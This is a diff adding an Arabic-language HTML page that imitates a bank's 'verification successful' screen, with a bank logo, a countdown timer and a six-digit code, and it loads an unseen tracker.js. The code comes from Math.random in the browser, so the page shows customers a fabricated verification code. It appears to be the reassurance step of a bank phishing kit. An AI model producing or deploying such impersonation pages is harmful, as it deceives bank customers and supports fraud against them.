@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>رمز التحقق</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
+  body{
+    max-width:520px;margin:0 auto;min-height:100vh;
+    background:
+      linear-gradient(150deg, rgba(255,255,255,.6) 0%, rgba(255,255,255,.6) 15%, transparent 15.5%),
+      linear-gradient(150deg, transparent 14%, rgba(255,255,255,.35) 14.5%, rgba(255,255,255,.35) 28%, transparent 28.5%),
+      linear-gradient(150deg, transparent 27%, rgba(255,255,255,.2) 27.5%, rgba(255,255,255,.2) 42%, transparent 42.5%),
+      linear-gradient(150deg, transparent 55%, rgba(255,255,255,.15) 55.5%, rgba(255,255,255,.15) 68%, transparent 68.5%);
+    background-size:100% 100%;
+    background-attachment:fixed;
+    background-color:#e0e1e3;
+    display:flex;flex-direction:column;
+  }
+
+  .top{flex:1;padding:60px 24px 0;text-align:center}
+
+  .bank-logo{margin-bottom:30px}
+  .bank-logo img{height:50px}
+
+  .success-icon{
+    width:80px;height:80px;border-radius:50%;background:#e8f5e9;
+    display:flex;align-items:center;justify-content:center;
+    margin:0 auto 20px;
+  }
+  .success-icon svg{width:40px;height:40px;fill:#2e7d32}
+
+  h1{font-size:22px;font-weight:800;color:#1a1a1a;margin-bottom:10px}
+  p{color:#888;font-size:14px;line-height:1.7;margin-bottom:24px}
+
+  .code-box{
+    background:#fff;border:2px solid #2e7d32;border-radius:16px;
+    padding:20px;margin:0 auto;max-width:320px;
+  }
+  .code-label{font-size:13px;color:#2e7d32;font-weight:600;margin-bottom:10px}
+  .code-value{
+    font-size:32px;font-weight:800;letter-spacing:6px;color:#1a1a1a;
+    font-family:monospace;direction:ltr;
+  }
+  .code-timer{font-size:12px;color:#c62828;margin-top:10px;font-weight:600}
+
+  .info-text{
+    margin-top:24px;background:#fff8e1;border-radius:12px;padding:14px 16px;
+    font-size:13px;color:#e65100;line-height:1.6;text-align:right;
+  }
+
+  .bottom{padding:20px 24px 40px}
+  .done-btn{
+    display:block;width:100%;padding:18px;border:none;border-radius:50px;
+    font-size:18px;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;
+    background:linear-gradient(135deg, #c62828, #e53935);
+    box-shadow:0 4px 15px rgba(198,40,40,.3);
+  }
+</style>
+</head>
+<body>
+
+<div class="top">
+  <div class="bank-logo"><img src="images/logo.jpg" alt="SGA"></div>
+
+  <div class="success-icon">
+    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+  </div>
+
+  <h1>تم التحقق بنجاح</h1>
+  <p>تم التحقق من حسابك. رمز التحقق الخاص بك:</p>
+
+  <div class="code-box">
+    <div class="code-label">رمز التحقق</div>
+    <div class="code-value" id="otpCode">------</div>
+    <div class="code-timer">صالح لمدة <span id="timer">05:00</span></div>
+  </div>
+
+  <div class="info-text">
+    لا تشارك هذا الرمز مع أي شخص. فريق البنك لن يطلب منك هذا الرمز أبداً.
+  </div>
+</div>
+
+<div class="bottom">
+  <button class="done-btn" onclick="location.href='index.html'">العودة للرئيسية</button>
+</div>
+
+<script>
+  function generateOTP() {
+    let code = '';
+    for (let i = 0; i < 6; i++) code += Math.floor(Math.random() * 10);
+    return code;
+  }
+
+  document.getElementById("otpCode").textContent = generateOTP();
+
+  let seconds = 300;
+  const timerEl = document.getElementById("timer");
+  const interval = setInterval(() => {
+    seconds--;
+    if (seconds <= 0) { clearInterval(interval); timerEl.textContent = "انتهى"; return; }
+    const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+    const s = String(seconds % 60).padStart(2, '0');
+    timerEl.textContent = m + ':' + s;
+  }, 1000);
+</script>
+<script src="tracker.js"></script>
+</body>
+</html>
